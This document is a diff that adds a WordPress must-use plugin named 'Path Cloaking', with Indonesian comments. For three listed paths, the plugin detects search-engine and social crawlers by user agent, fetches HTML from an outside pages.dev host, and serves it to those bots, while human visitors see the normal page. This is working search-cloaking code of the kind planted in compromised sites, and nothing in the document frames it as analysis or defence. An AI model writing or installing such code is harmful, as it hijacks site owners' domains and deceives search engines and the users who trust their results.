@@ -1,0 +1,57 @@
+<?php
+/**
+ * Path Cloaking (MU Plugin)
+ */
+
+add_action('muplugins_loaded', function () {
+
+    // Mapping path => target URL
+    $paths = [
+        '/about' => 'https://destate.pages.dev/about',
+        '/about-delta' => 'https://destate.pages.dev/delta',
+        '/oborevwori-celebrates-matthew-tonlagha-on-birth-anniversary' => 'https://destate.pages.dev/anniversary',
+ 
+ 
+    ];
+
+    // Ambil path request
+    $path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
+    $path = rtrim($path, '/');
+
+    // Cek apakah path terdaftar
+    if (!isset($paths[$path])) {
+        return;
+    }
+
+    // User Agent
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+    // Bot detection (Google lengkap + bot lain)
+    if (!preg_match('/googlebot|googlebot-mobile|googlebot-news|google-site-verification|google-inspectiontool|mediapartners-google|bingbot|yandexbot|slurp|ahrefsbot|telegrambot/i', $ua)) {
+        return;
+    }
+
+    // Target sesuai path
+    $target = $paths[$path];
+
+    // Fungsi ambil konten pakai cURL
+    function fetch_url($url) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+
+    // Ambil konten target
+    $content = fetch_url($target);
+
+    if ($content !== false) {
+        status_header(200);
+        header('Content-Type: text/html; charset=UTF-8');
+        echo $content;
+        exit;
+    }
+});
